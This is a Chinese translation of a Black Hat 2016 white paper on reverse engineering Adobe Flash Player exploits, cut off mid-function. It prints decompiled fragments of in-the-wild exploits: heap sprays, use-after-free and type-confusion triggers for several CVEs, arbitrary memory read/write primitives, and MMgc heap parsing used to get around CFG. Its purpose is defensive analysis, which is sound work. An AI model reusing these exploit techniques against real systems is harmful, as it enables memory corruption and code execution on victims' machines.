原文链接：<https://www.blackhat.com/docs/us-16/materials/us-16-Oh-The-Art-of-Reverse-Engineering-Flash-Exploits-wp.pdf>  

原作者：jeongoh@microsoft.com

译： **xd0ol1 (知道创宇404实验室)**

### 0 关于Adobe Flash Player的漏洞

随着近来Java插件和Web浏览器在安全防护措施上的提升，攻击者们开始重新关注起Adobe Flash Player来，并将其视作主要的漏洞利用攻击目标。

多年来，借助Vector结构的corruption一直是实现Flash漏洞利用的首选方案。Vector是Adobe Flash
Player中的一个数据结构，它以非常简洁的形式保存在native空间中，我们可以很容易的操纵此结构而不必担心其它字段会被破坏。而在引入Vector的长度保护后，攻击者们又转向了ByteArray结构的corruption（CVE-2015-7645）。

另一方面，CFG（Control Flow Guard）保护或者又叫CFI（Control Flow Integrity）保护是由Windows
8.1系统引入的，最新的Adobe Flash
Player中也用到了此技术。对exploit开发者来说利用对象vftable的corruption已经是很常见的技术了，CFG就是针对此提出的缓解策略，它将在vftable中的虚函数调用前进行有效性的判断，如果调用未被确认则会退出进程。

### 1 逆向分析方法

分析Adobe Flash
Player的exploit是一件非常具有挑战性的工作，由于缺少高效的字节码调试工具，这使得漏洞调试对安全研究人员来说简直就是一场噩梦，并且exploit的混淆处理通常都是一个单向的过程，任何试图反编译它们的行为都会产生警告。当然，确实也存在很多好用的反编译器，但它们通常在某些点上会执行失败，而且攻击者经常想出新的混淆方案来保护他们的exploit不被逆向。更糟的是除非你能获取源码，不然你还真没什么好的方法来验证反编译结果的准确性。由于反编译时的这种限制，在逆向过程中通常会用到多种分析工具及技术。

#### 1.1 反编译工具

事实上，还是有许多针对SWF文件的商业版和开源版反编译器。其中，[JPEXS Free Flash
Decompiler](https://github.com/jindrapetrik/jpexs-decompiler)是开源中较有用的反编译器之一，而对于商业版来说，[Action Script
Viewer](http://www.buraks.com/asv/)的反编译结果要好得多。限制这些工具的根本原因在于SWF文件中存在大量的混淆代码，这使得反编译几近不可能或者结果中包含有严重的错误。此外，一些反编译器只给出了它们能生成的最好结果，但对可能的错误却从不提供警告。

下面为其中一款反编译器处理过程中产生的错误，当出现“unresolved jump”错误时，在这附近的反编译结果往往不是那么准确。

    
    
     for (;_local_9 < _arg_1.length;(_local_6 = _SafeStr_128(_local_5, 0x1E)), goto _label_2, if (_local_15 < 0x50) goto _label_1;
    , (_local_4 = _SafeStr_129(_local_4, _local_10)), for (;;)
     {
       _local_8 = _SafeStr_129(_local_8, _local_14);
       (_local_9 = (_local_9 + 0x10));
       //unresolved jump <- unresolved jump error
       // @239 jump @254

图1 ASV反编译器的“unresolved jump”错误

下列给出了错误发生处的反汇编结果，可以看到大部分是针对反编译器进行混淆的花指令。对未初始化寄存器用于产生带有垃圾指令代码块的情况，大多数反编译器还不能进行很好的识别。

    
    
     getlocal3
     getlocal 15 ; 0x0F 0x0F
     getlocal 17 ; 0x11 0x11 // register 17 is never initialized
     iftrue L511 ; 0xFF 0xFF // This condition is always false
     jump L503 ; 0xF7 0xF7
     ; 0xD7 <- Start of garbage code (this code will be never reached)
     ; 0xC2
     ; 0x0B
     ; 0xC2
     ; 0x04
     ; 0x73
     ; 0x92
     ; 0x0A
     ; 0x08
     ; 0x0F
     ; 0x85
     ; 0x64
     ; 0x08
     ; 0x0C
    L503:
     pushbyte 8 ; 0x08 0x08 // All garbage code
     getlocal 17 ; 0x11 0x11
     iffalse L510 ; 0xFE 0xFE
     negate_i
     increment_i
     pushbyte 33 ; 0x21 0x21
     multiply_i
    L510:
     subtract
    L511:
     getproperty MultinameL([PrivateNamespace("*", "override const/class#0"), PackageNamespace("", "#0"), PrivateNamespace("*",
    "override const/class#1"), PackageInternalNs(""), Namespace("http://adobe.com/AS3/2006/builtin"), ProtectedNamespace("override
    const"), StaticProtectedNs("override const")]) ; 0x20 0x20

图2 花指令

#### 1.2 反汇编工具

另一种分析方法是借助反汇编器。[RABCDAsm](https://github.com/CyberShadow/RABCDAsm)是一款非常强大的反汇编器，它可以从SWF文件中提取出AVM2（ActionScript
Virtual Machine 2）中使用的ABC（ActionScript Byte
Code）字段，并反汇编其中的字节码。更多有关AVM2的指令信息，请参考[ActionScript Virtual Machine 2 Overview
from
Adobe](https://www.adobe.com/content/dam/Adobe/en/devnet/actionscript/articles/avm2overview.pdf)。

不过我们发现最新的Angler攻击包中会通过特定代码来实现SWF文件的反反汇编，例如给lookupswitch指令赋一个很大的case_count值但跳转地址中却不包含实际的代码，此方法就可用来对诸如RABCDasm这样的工具进行反反汇编处理。

    
    
    L4:
     lookupswitch L6-42976, []

图3 恶意的lookupswitch指令

下述为readMethodBody函数中针对此特定情况的补丁代码，它会过滤掉case_count值大于0xffff的所有lookupswitch指令。

    
    
    case OpcodeArgumentType.SwitchTargets:
    - instruction.arguments[i].switchTargets.length = readU30()+1;
    - foreach (ref label; instruction.arguments[i].switchTargets)
    + int length = readU30();
    + if (length<0xffff)
      {
    -   label.absoluteOffset = instructionOffset + readS24();
    -   queue(label.absoluteOffset);
    +   instruction.arguments[i].switchTargets.length = length+1;
    +   foreach (ref label; instruction.arguments[i].switchTargets)
    +   {
    +     label.absoluteOffset = instructionOffset + readS24();
    +     queue(label.absoluteOffset);
    +   }
    +   break;
    + }
    + else
    + {
    +   writefln("Abnormal SwitchTargets length: %x", length);
      }
    - break;

图4 readMethodBody函数中的补丁

同时，由于我们也可以通过RABCDAsm来编译AS脚本，所以如果在汇编文件中有发现恶意ABC字段生成的无效lookupswitch指令，我们也应该忽略它们。writeMethodBody函数中的补丁代码如下。

    
    
    case OpcodeArgumentType.SwitchTargets:
    - if (instruction.arguments[i].switchTargets.length < 1)
    -   throw new Exception("Too few switch cases");
    - writeU30(instruction.arguments[i].switchTargets.length-1);
    - foreach (off; instruction.arguments[i].switchTargets)
    + if (instruction.arguments[i].switchTargets.length > 0)
      {
    -   fixups ~= Fixup(off, pos, instructionOffset);
    -   writeS24(0);
    +   //throw new Exception("Too few switch cases");
    +   writeU30(instruction.arguments[i].switchTargets.length-1);
    +   foreach (off; instruction.arguments[i].switchTargets)
    +   {
    +     fixups ~= Fixup(off, pos, instructionOffset);
    +     writeS24(0);
    +   }
      }
      break;
    }

图5 writeMethodBody函数中的补丁

#### 1.3 FlashHacker

[FlashHacker](https://github.com/ohjeongwook/FlashHacker)是一个开源的项目，它最初是基于ShmooCon
2012大会上提出的[相关概念](https://github.com/ohjeongwook/Publications/blob/master/Jeong_Wook_Oh_AVM%2520Inception%2520-%2520ShmooCon2012.pdf)而开发的原型。在此之上我们进行了二次开发，使之可以对更多的AVM字节码元素进行插桩，并提供了更详细的过滤选项。在进行AVM字节码插桩时，其中的一大挑战是由于CPU密集型计算而导致的性能下降。例如，借助插桩代码进行的堆喷操作通常会由于Flash
Player中的超时机制导致漏洞利用的失败。但我们仍然可以通过过滤这些CPU密集型计算的代码来执行精确操作，插桩技术通常适用于RCA（root cause
analysis）分析以及我们最近进行的有关保护措施绕过方面的研究。

#### 1.4 AVMPlus源码

要是能获取当前分析程序的源码，那么这无疑很有优势。我们可以在[AVMplus](https://github.com/adobe-flash/avmplus)项目中查看AVM的开源实现，这对理解一些漏洞利用程序的操作会很有帮助，我们甚至发现一些利用程序直接使用了AVMplus中的代码，比如其中的MMgc实现部分。

#### 1.5 Native层Flash调试

此外，除非我们能获取Flash程序的符号信息，否则在native层对Flash漏洞或exploit的调试都将是极富挑战性的。

### 2 RW primitives

“read/write
primitives”是指exploit中用于实现内存读写的对象或函数，现今的漏洞攻击通常需要借此来绕过ASLR或DEP等保护机制。而从防御者的角度来看，如果能知道exploit中所利用的RW
primitives，那么将有助于弄清exploit是采用何种方式来绕过诸如CFG这样的保护措施。

#### 2.1 Vector结构的corruption

自从CVE-2013-0634中引入Lady
Boyle的利用方式后，对Vector结构的corruption事实上就成了Flash漏洞利用的标准，甚至一些IE的漏洞（CVE-2013-3163，CVE-2014-0322和CVE-2014-1776）也用到了此方法。有关IE中Vector结构的利用详情，可以参考Chun
Feng和Elia
Florio所发的[文章](https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-FengFlorio.pdf)。

下述的CVE-2015-5122（TextLine的UAF漏洞）利用代码就是通过标准的Vector结构corruption来实现RW
primitives，当把Vector.\和TextLine对象布局到内存中的相邻位置后，就可以触发use-after-free了。在此情况下，通过正常的Vector对象赋值操作就可将相邻Vector对象的length字段置为0x40000000。因此，这个corrupt后的Vector结构能被用作RW
primitives。

    
    
    public class MyClass extends MyUtils
    {
      ...
      static var _mc:MyClass;
      static var _vu:Vector.<uint>;
      static var LEN40:uint = 0x40000000;
      static function TryExpl()
      {
        ...
        _arLen1 = (0x0A * 0x03);
        _arLen2 = (_arLen1 + (0x04 * 0x04));
        _arLen = (_arLen2 + (0x0A * 0x08));
        _ar = new Array(_arLen);
        _mc = new MyClass();
        ...
        _vLen = ((0x0190 / 0x04) - 0x02);
        while (i < _arLen1)
        {
          _ar[i] = new Vector.<uint>(_vLen);
          i = (i + 1);
        };

图6 第一次Vector对象的喷射

    
    
    i = _arLen2;
    while (i < _arLen)
    {
      _ar[i] = new Vector.<uint>(0x08);
      _ar[i][0x00] = i;
      i = (i + 1);
    };
    i = _arLen1;

图7 第二次Vector对象的喷射

    
    
    while (i < _arLen2)
    {
      _ar[i] = _tb.createTextLine(); //_tb is TextBlock object
      i = (i + 1);
    };
    i = _arLen1;
    while (i < _arLen2)
    {
      _ar[i].opaqueBackground = 0x01;
      i = (i + 1);
    };

图8 TextLine对象的喷射

在完成Vector和TextLine对象的喷射操作后，该exploit会将valueOf2赋给自身MyClass类中的prototype对象。

    
    
    MyClass.prototype.valueOf = valueOf2;
    _cnt = (_arLen2 - 0x06);
    _ar[_cnt].opaqueBackground = _mc; // Trigger use-after-free vulnerability (static var _mc:MyClass)

图9 触发UAF漏洞

接着，当_mc变量赋给opaqueBackground时valueOf2函数会被调用。

    
    
    static function valueOf2()
    {
      var i:int;
      try
      {
        if (++_cnt < _arLen2)
        {
          _ar[_cnt].opaqueBackground = _mc;
        }
        else
        {
          Log("MyClass.valueOf2()");
          i = 0x01;
          while (i <= 0x05)
          {
            _tb.recreateTextLine(_ar[(_arLen2 - i)]); // Trigger use-after-free condition
            i = (i + 1);
          };
          i = _arLen2;
          while (i < _arLen)
          {
            _ar[i].length = _vLen;
            i = (i + 1);
          };
        };
        ...
        return ((_vLen + 0x08));
      }

图10 调用valueOf2函数

    
    
    i = _arLen2;
    while (i < _arLen)
    {
      _vu = _ar[i];
      if (_vu.length > (_vLen + 0x02))
      {
        Log(((("ar[" + i) + "].length = ") + Hex(_vu.length)));
        Log(((((("ar[" + i) + "][") + Hex(_vLen)) + "] = ") + Hex(_vu[_vLen])));
        if (_vu[_vLen] == _vLen)
        {
          _vu[_vLen] = LEN40; // Corrupt _vu[_vLen+0x02].length to LEN40 (0x40000000)
          _vu = _ar[_vu[(_vLen + 0x02)]]; // _vu now points to corrupt Vector element
          break;
        };
      };
      i = (i + 1);
    };

图11 查找corrupt后的Vector元素

此过程中FlashHacker的日志信息如下所示，可以看到Vector.\.length字段被置成了0x40000000。

    
    
    * Detection: Setting valueOf: Object=Object Function=valueOf2
    * Setting property: MyClass.prototype.valueOf
    Object Name: MyClass.prototype
    Object Type: Object
    Property: valueOf
    Location: MyClass32/class/TryExpl
    builtin.as$0::MethodClosure
     function Function() {}
    
    * Detection: CVE-2015-5122
    * Returning from: MyClass._tb.recreateTextLine
    * Detection: CVE-2015-5122
    * Returning from: MyClass._tb.recreateTextLine
    * Detection: CVE-2015-5122
    * Returning from: MyClass._tb.recreateTextLine
    * Detection: CVE-2015-5122
    * Returning from: MyClass._tb.recreateTextLine
    * Detection: CVE-2015-5122
    * Returning from: MyClass._tb.recreateTextLine
    * Detection: Vector Corruption
    Corrupt Vector.<uint>.length: 0x40000000 at MyClass32/class/TryExpl L239 <- Vector corruption detected
    ... Message repeat starts ...
    
    ... Last message repeated 2 times ...
    Writing __AS3__.vec::Vector.<uint>[0x3FFFFF9A]=0x6A->0x62 Maximum Vector.<uint>.length:328 <- out-of-bounds access
    Location: MyClass32/class/Prepare (L27)
    Current vector.<Object> Count: 1 Maximum length:46
    Writing __AS3__.vec::Vector.<uint>[0x3FFE6629]=0xAC84EE0->0xA44B348 Maximum Vector.<uint>.length:328
    Location: MyClass32/class/Set (L20)
    Writing __AS3__.vec::Vector.<uint>[0x3FFE662A]=0xAE76041->0x9C Maximum Vector.<uint>.length:328
    Location: MyClass32/class/Set (L20)

图12 Vector结构corrupt过程中的FlashHacker日志

#### 2.2 ByteArray结构的corruption

在代号为DUBNIUM的行动中，我们发现CVE-2015-8651的利用样本通过对ByteArray.length字段的corruption来实现RW
primitives，此技术是为了绕过Vector的长度保护而引入的。

    
    
    _local_4 = 0x8012002C;
    si32(0x7FFFFFFF, (_local_4 + 0x7FFFFFFC)); // Out-of-bounds write with si32 upon ByteArray.length location at _local_4 + 0x7FFFFFFC with value of 0x7FFFFFFF

图13 通过si32指令对ByteArray.length字段进行corrupt

在完成ByteArray.length字段的corrupt后，我们还需要找到受影响的那个ByteArrays元素。

    
    
    _local_10 = 0x00;
    while (_local_10 < bc.length)
    {
      if (bc[_local_10].length > 0x10) // Check if ByteArray.length is corrupt
      {
        cbIndex = _local_10; // Index of corrupt ByteArray element in the bc array
      }
      else
      {
        bc[_local_10] = null;
      };
      _local_10++;
    };

图14 确定受影响的ByteArray元素

下面给出的是此exploit提供的各个RW primitives方法，基本上能支持各个操作系统中的目标程序。

    
    
    public function read32(destAddr:Number, modeAbs:Boolean=true):Number
    private function read32x86(destAddr:int, modeAbs:Boolean):uint
    private function read32x64(destAddr:Number, modeAbs:Boolean):uint
    public function readInt(u1:int, u2:int, mod:uint):int
    public function read64(destAddr:Number, modeAbs:Boolean=true):Number
    private function read64x86(destAddr:int, modeAbs:Boolean):Number
    private function read64x64(destAddr:Number, modeAbs:Boolean):Number
    public function readBytes(destAddr:Number, nRead:uint, modeAbs:Boolean=true):ByteArray
    private function readBytesx86(destAddr:uint, nRead:uint, modeAbs:Boolean):ByteArray
    private function readBytesx64(destAddr:Number, nRead:uint, modeAbs:Boolean):ByteArray
    public function write32(destAddr:Number, value:uint, modeAbs:Boolean=true):Boolean
    private function write32x86(destAddr:int, value:uint, modeAbs:Boolean=true):Boolean
    private function write32x64(destAddr:Number, value:uint, modeAbs:Boolean=true):Boolean
    public function write64(destAddr:Number, value:Number, modeAbs:Boolean=true):Boolean
    private function write64x86(destAddr:uint, value:Number, modeAbs:Boolean):Boolean
    private function write64x64(destAddr:Number, value:Number, modeAbs:Boolean):Boolean
    public function writeBytes(destAddr:Number, baWrite:ByteArray, modeAbs:Boolean=true):ByteArray
    private function writeBytesx86(destAddr:uint, ba:ByteArray, modeAbs:Boolean):ByteArray
    private function writeBytesx64(destAddr:Number, ba:ByteArray, modeAbs:Boolean):ByteArray

图15 RW primitives方法

例如，read32x86方法可用于读取x86平台上任意进程空间的内容。其中，cbIndex变量是bc数组的索引，该数组为ByteArray类型，同时，bc[cbIndex]对应的正是那个corrupt后的ByteArray元素。首先需要通过position成员来设置目标地址，之后便可以使用readUnsignedInt方法读取此内存值。

    
    
    private function read32x86(destAddr:int, modeAbs:Boolean):uint
    {
      var _local_3:int;
      if (((isMitisSE) || (isMitisSE9)))
      {
        bc[cbIndex].position = destAddr;
        bc[cbIndex].endian = "littleEndian";
        return (bc[cbIndex].readUnsignedInt());
      };

图16 Read primitive方法

write32x86方法也是相同的道理，它借助writeUnsignedInt来实现任意内存的写入操作。

    
    
    private function write32x86(destAddr:int, value:uint, modeAbs:Boolean=true):Boolean
    {
      if (((isMitisSE) || (isMitisSE9)))
      {
        bc[cbIndex].position = destAddr;
        bc[cbIndex].endian = "littleEndian";
        return (bc[cbIndex].writeUnsignedInt(value));
      };

图17 Write primitive方法

基于这些，exploit也就能够完成一些更复杂的操作了，例如可以借助readBytes方法实现多个字节的读取。

    
    
    private function readBytesx86(destAddr:uint, nRead:uint, modeAbs:Boolean):ByteArray
    {
      var _local_4:ByteArray = new ByteArray();
      var _local_5:uint = read32(rwableBAPoiAddr);
      write32(rwableBAPoiAddr, destAddr);
      var _local_6:uint;
      if (nRead > 0x1000)
      {
        _local_6 = read32((rwableBAPoiAddr + 0x08));
        write32((rwableBAPoiAddr + 0x08), nRead);
      };
      rwableBA.position = 0x00;
      try
      {
        rwableBA.readBytes(_local_4, 0x00, nRead);
      }

图18 读取单个字节

#### 2.3 ConvolutionFilter.matrix和tabStops的类型混淆

CVE-2016-1010这个堆溢出漏洞存在于BitMapData.copyPixel方法中，相应exploit中用到的RW
primitives是很有意思的，值得注意的是这些RW primitives功能将用于实现ByteArray对象的RW
primitives，后面的内存读写也主要借助这个corrupt后的ByteArray对象。因此，最开始实现的RW
primitives功能只起到了一个临时的作用，由之实现的ByteArray对象上的RW
primitives功能才是主要的，因为就编程来说操作ByteArray对象会显得更直观些。

实现RW primitives功能的第一步为执行Convolutionfilter对象的喷射操作。

    
    
    public function SprayConvolutionFilter():void
    {
      var _local_2:int;
      hhj234kkwr134 = new ConvolutionFilter(defaultMatrixX, 1);
      mnmb43 = new ConvolutionFilter(defaultMatrixX, 1);
      hgfhgfhfg3454331 = new ConvolutionFilter(defaultMatrixX, 1);
      var _local_1:int;
      while (_local_1 < 0x0100)
      {
        _local_2 = _local_1++;
        ConvolutionFilterArray[_local_2] = new ConvolutionFilter(defaultMatrixX, 1); // heap spraying ConvolutionFilter objects
      };
    }

接着由copyPixels方法触发此漏洞后，exploit会通过调用TypeConfuseConvolutionFilter方法来创建一个类型混淆的ConvolutionFilter对象。

    
    
    public function TriggerVulnerability():Boolean
    {
      var _local_9:int;
      var sourceBitmapData:BitmapData = new BitmapData(1, 1, true, 0xFF000001); // fill color is FF000001
      var sourceRect:Rectangle = new Rectangle(-880, -2, 0x4000000E, 8);
      var destPoint:Point = new Point(0, 0);
      var _local_4:TextFormat = new TextFormat();
      _local_4.tabStops = [4, 4];
      ...
      _local_1.copyPixels(sourceBitmapData, sourceRect, destPoint);
      if (!(TypeConfuseConvolutionFilter()))
      {
        return (false);
      };

图19 在TriggerVulnerability中调用TypeConfuseConvolutionFilter

对于TypeConfuseConvolutionFilter函数，它将借助DWORD值0x55667788来标识corrupt后的内存区域，并借此定位堆喷对象中那个类型混淆的ConvolutionFilter元素。

    
    
    public function TypeConfuseConvolutionFilter():Boolean
    {
      ...
      while (_local_3 < 0x0100)
      {
        _local_4 = _local_3++;
        ConvolutionFilterArray[_local_4].matrixY = kkkk2222222;
        ConvolutionFilterArray[_local_4].matrix = _local_2;
      };
      ...
      _local_5 = gfhfghsdf22432.ghfg43[bczzzzz].matrix;
      _local_5[0] = jjj3.IntToNumber(0x55667788); // Corrupt memory
      gfhfghsdf22432.ghfg43[bczzzzz].matrix = _local_5;
      ConfusedConvolutionFilterIndex = -1;
      _local_3 = 0;
      while (((ConfusedConvolutionFilterIndex == (-1)) && ((_local_3 < ConvolutionFilterArray.length))))
      {
        matrix = ConvolutionFilterArray[_local_3].matrix;
        _local_4 = 0;
        _local_6 = _local_9.length;
        while (_local_4 < _local_6)
        {
          _local_7 = _local_4++;
          if ((jjj3.NumberToDword(matrix[_local_7]) == 0x55667788)) // Locate type-confused ConvolutionFilter object
          {
            ConfusedConvolutionFilterIndex = _local_3;
            break;
          };
        };
        _local_3++;
      };

图20 对ConvolutionFilter进行类型混淆并找出受影响的元素

而在创建完类型混淆的ConvolutionFilter对象后，exploit将借其来定位类型混淆的TextField对象。

    
    
    public function TriggerVulnerability():Boolean
    {
      ...
      var _local_7:Boolean;
      var _local_8:int;
      while (_local_8 < 16)
      {
        _local_9 = _local_8++;
        TextFieldArray[_local_9].setTextFormat(_local_4, 4, 5);
        ConfusedMatrix = ConvolutionFilterArray[((ConfusedConvolutionFilterIndex + 5) - 1)].matrix;
        if ((jjj3.NumberToDword(ConfusedMatrix[ConfusedMatrixIndex]) == 8))
        {
          ConfusedTextField = TextFieldArray[_local_9]; // Type-confused TextField
          _local_7 = true;
          break;
        };
      };

图21 查找类型混淆的TextField对象

最后看一下Read4方法的实现，如果存在corrupt后的ByteArray对象，那么将会优先通过它来读取内存，同时此方法中也可以借助类型混淆的ConvolutionFilter和TextField对象进行内存的读取，其中目标地址由ConvolutionFilter对象来传递，然后通过textFormat.tabStops[0]来读取内存数据。

    
    
    public function read4(_arg_1:___Int64):uint
    {
      var matrixIndex:int;
      if (IsByteArrayCorrupt)
      {
        SetCorruptByteArrayPosition(_arg_1);
        return (CorruptByteArray.readUnsignedInt());
      };
      matrixIndex = (17 + ConfusedMatrixIndex);
      TmpMatrix[matrixIndex] = jjj3.IntToNumber(_arg_1.low);
      TmpMatrix[(matrixIndex + 1)] = jjj3.IntToNumber(1);
      ConvolutionFilterArray[((ConfusedConvolutionFilterIndex + 5) - 1)].matrix = TmpMatrix;
      textFormat = ConfusedTextField.getTextFormat(0, 1);
      return (textFormat.tabStops[0]);
    }

图22 通过TextFormat.tabStops[0]读取内存数据

### 3 CFG保护

自从Adobe Flash
Player中引入CFG保护后，代码执行对于exploit开发者来说就成了一个很艰巨的任务，我们总结了他们近来使用的各项技术，发现CFG还是非常强大的，它使得exploit的开发成本大幅提高了。事实上，在过去两年中，坊间并未出现针对微软Windows
8.1+系统中Internet Explorer 11的远程代码执行0day漏洞，这些系统都是有CFG保护的。

    
    
    .text:10C5F13B mov esi, [esp+58h+var_3C]
    .text:10C5F13F lea eax, [esp+58h+var_34]
    .text:10C5F143 movups xmm1, [esp+58h+var_34]
    .text:10C5F148 movups xmm0, [esp+58h+var_24]
    .text:10C5F14D push dword ptr [esi]
    .text:10C5F14F mov esi, [esi+8]
    .text:10C5F152 pxor xmm1, xmm0
    .text:10C5F156 push eax
    .text:10C5F157 push eax
    .text:10C5F158 mov ecx, esi
    .text:10C5F15A movups [esp+64h+var_34], xmm1
    .text:10C5F15F call ds:___guard_check_icall_fptr // CFG check routine
    .text:10C5F165 call esi

图23 CFG检测代码

#### 3.1 引入CFG前的代码执行技术 - vftable的corruption

在引入CFG保护之前，如果exploit能够获取目标进程空间的读写特权，那么代码执行就变得很容易了，大部分情况下只需corrupt目标对象的vftable表，然后就可以调用自身代码了，其中FileReference和Sound是最常利用的目标对象。以下CVE-2015-0336的exploit代码给出了一个通过FileReference.cancel方法进行代码执行的例子。

    
    
    var _local_10:uint = (read32((_local_5 + (((0x08 - 1) * 0x28) * 0x51))) + (((((-(0x9C) + 1) - 1) - 0x6E) - 1) + 0x1B));
    var _local_4:uint = read32(_local_10);
    write32(_local_10, _local_7);
    cool_fr.cancel();

图24 在利用代码中调用FileReference.cancel

下述为此exploit借助FileReference对象执行shellcode的日志信息。

    
    
    Writing __AS3__.vec::Vector.<uint>[0x7FFFFBFE]=0x9A90201E->0x1E Maximum Vector.<uint>.length:1022
    Location: Main/instance/trig_loaded (L340)
    Writing __AS3__.vec::Vector.<uint>[0x7FFFFBFF]=0x7E74027->0x7E74000 Maximum Vector.<uint>.length:1022
    Location: Main/instance/trig_loaded (L402)
    Writing __AS3__.vec::Vector.<uint>[0x7BBE2F8F]=0x931F1F0->0x2A391000 Maximum Vector.<uint>.length:1022
    Location: Main/instance/Main/instance/write32 (L173)
    > Call flash.net::FileReference QName(PackageNamespace("", null), "cancel"), 0
    Instruction: callpropvoid QName(PackageNamespace("", null), "cancel"), 0
    Called from: Main/instance/trig_loaded:L707
    * Returning from: flash.net::FileReference QName(PackageNamespace("", null), "cancel"), 0
    Writing __AS3__.vec::Vector.<uint>[0x7BBE2F8F]=0x2A391000->0x931F1F0 Maximum Vector.<uint>.length:1022
    Location: Main/instance/Main/instance/write32 (L173)
    Writing __AS3__.vec::Vector.<uint>[0x7FFFFFFE]=0x7FFFFFFF->0x1E Maximum Vector.<uint>.length:1022
    Location: Main/instance/Main/instance/repair_vector (L32)

图25 通过FileReference.cancel调用执行shellcode

### 4 MMgc内存管理垃圾回收器

随着CFG保护的引入，攻击者们又转而在MMgc中查找能够利用的目标，以便完成接下去的代码执行。对MMgc来说，它在许多内部结构的分配上具有可预测的行为，这有助于攻击者们解析MMgc中的对象结构从而找出可利用的目标。

#### 4.1 查找对象

坊间发现的CVE-2016-1010利用样本会通过解析MMgc的内部结构来达成多种目的，此过程需要先泄露对象的内存地址，在此样本中，泄漏的地址来自于一个类型混淆的ConvolutionFilter对象。

    
    
    public function TriggerVulnerability():Boolean
    {
      ...
      _local_1.copyPixels(_local_1, _local_2, _local_3);
      if (!(TypeConfuseConvolutionFilter()))
      {
        return (false);
      };
      ...
      gfhfghsdf22432.ghfg43[(bczzzzz + 1)].matrixX = 15;
      gfhfghsdf22432.ghfg43[bczzzzz].matrixX = 15;
      gfhfghsdf22432.ghfg43[((bczzzzz + 6) - 1)].matrixX = 15;
      LeakedObjectAddress = jjj3.hhhh33((jjj3.NumberToDword(ConvolutionFilterArray[ConfusedConvolutionFilterIndex].matrix[0]) & - 4096), 0);

图26 泄漏对象的内存地址

下述代码给出的是EnumerateFixedBlocks(hhh222)函数的起始部分。

    
    
    public function EnumerateFixedBlocks (param1:int, param2:Boolean, param3:Boolean = true, param4:___Int64 = undefined) : Array
    {
      ...
      var _loc6_:* = ParseFixedAllocHeaderBySize(param1,param2);

图27
在EnumerateFixedBlocks(hhh222)中会进行ParseFixedAllHeaderBySize和ParseFixedBlock调用

由分析可知，EnumerateFixedBlocks(hhh222)首先会调用ParseFixedAllocHeaderBySize(ghfgfh23)，
而ParseFixedAllocHeaderBySize(ghfgfh23)又会通过LocateFixedAllocAddrBySize(jjj34fdfg)和ParseFixedAllocHeader(cvb45)函数来获取并解析那些具有特定大小的对象。

    
    
    public function ParseFixedAllocHeaderBySize(_arg_1:int, _arg_2:Boolean):Object
    {
      var _local_3:ByteArray = gg2rw.readn(LocateFixedAllocAddrBySize(_arg_1, _arg_2), FixedAllocSafeSize);
      return (ParseFixedAllocHeader(_local_3, LocateFixedAllocAddrBySize(_arg_1, _arg_2)));
    }

图28 ParseFixedAllocHeaderBySize(ghfgfh23)函数

#### LocateFixedAllocAddrBySize

LocateFixedAllocAddrBySize(jjj34fdfg)函数会通过arg_1参数来获取堆的大小，其返回值是相应堆块的内存起始地址。

    
    
    * Enter: Jdfgdfgd34/instance/jjj34fdfg(000007f0, True)
    * Return: Jdfgdfgd34/instance/jjj34fdfg 00000000`6fb7c36c

图29 LocateFixedAllocAddrBySize(jjj34fdfg)函数返回对象的内存地址，此对象大小为0x7f0

下面这部分代码会基于Flash的版本号和运行平台计算出地址的长度以及FixedAllocSafe结构的大小。

    
    
    public function Jdfgdfgd34(_arg_1:*, _arg_2:Object):void
    {
      ...
      AddressLength = 4;
      if (is64bit)
      {
        AddressLength = 8;
      };
      FixedAllocSafeSize = (((8 + (5 * AddressLength)) + AddressLength) + AddressLength);
      if ((cbc4344.FlashVersionTokens[0] >= 20))
      {
        FixedAllocSafeSize = (FixedAllocSafeSize + AddressLength);
      };

图30 确定MMgc中的相关偏移值和对象大小

而DetermineMMgcLocations(hgjdhjjd134134)函数则用于确定MMgc中相关的位置信息。

    
    
    public function DetermineMMgcLocations (_arg_1:___Int64, _arg_2:Boolean):Boolean
    {
      var _local_6 = (null as ___Int64);
      var _local_7 = (null as ___Int64);
      var _local_8 = (null as ___Int64);
      var _local_4:int = (jjjj222222lpmc.GetLow(_arg_1) & -4096);
      var _local_3:___Int64 = jjjj222222lpmc.ConverToInt64((_local_4 + jhjhghj23.bitCount), jjjj222222lpmc.GetHigh(_arg_1));
      _local_3 = jjjj222222lpmc.Subtract(_local_3, offset1);
      var _local_5:___Int64 = gg2rw.peekPtr(_local_3);
      _local_7 = new ___Int64(0, 0);
      _local_6 = _local_7;
      if ((((_local_5.high == _local_6.high)) && ((_local_5.low == _local_6.low))))
      {
        return (false);
      };
      cvbc345 = gg2rw.peekPtr(_local_5);
      ...
      if (!(IsFlashGT20))
      {
        _local_6 = SearchDword3F8(_local_5);
        M_allocs01 = _local_6;
        M_allocs02 = _local_6;
      }
      else
      {
        if (_arg_2)
        {
          M_allocs01 = SearchDword3F8(_local_5);
          ...
          M_allocs02 = SearchDword3F8(jjjj222222lpmc.AddInt64(M_allocs01, (FixedAllocSafeSize + 20)));
        }
        else
        {
          M_allocs02 = SearchDword3F8(_local_5);
          ...
          M_allocs01 = SearchDword3F8(jjjj222222lpmc.SubtractInt64(M_allocs02, (FixedAllocSafeSize + 20)));
        };
      };
      ...
    }

DetermineMMgcLocations(hgjdhjjd134134)函数会将对象泄露后得到的相关地址信息交由SearchDword3F8处理，而后SearchDword3F8函数会在内存中搜索DWORD值0x3F8
，这个值似乎是MMgc结构中一个非常重要的标识。

    
    
    public function SearchDword3F8(_arg_1:___Int64):___Int64
    {
      var currentAddr:___Int64 = _arg_1;
      var ret:int;
      while (ret != 0x3F8)
      {
        currentAddr = jjjj222222lpmc.SubtractInt64(currentAddr, FixedAllocSafeSize);
        if (IsFlashGT20)
        {
          ret = gg2rw.read4(jjjj222222lpmc.AddInt64(currentAddr, (AddressLength + 4)));
        }
        else
        {
          ret = gg2rw.read4(jjjj222222lpmc.AddInt64(currentAddr, AddressLength));
        };
      };
      return (jjjj222222lpmc.SubtractInt64(currentAddr, (AddressLength + 4)));
    }

图31 SearchDword3F8函数用于扫描内存中的DWORD值0x3f8

接着LocateFixedAllocAddrBySize(jjj34fdfg)函数会借助GetSizeClassIndex方法来获取索引值，并与前面得到的跟Flash版本及平台相关的大小信息一起用于计算FixedAlloc结构头的偏移量。

    
    
    public function LocateFixedAllocAddrBySize(_arg_1:int, _arg_2:Boolean):___Int64
    {
      var index:int = jhjhghj23. GetSizeClassIndex(_arg_1);
      var offset:int = ((2 * AddressLength) + (index * FixedAllocSafeSize));
      if (_arg_2)
      {
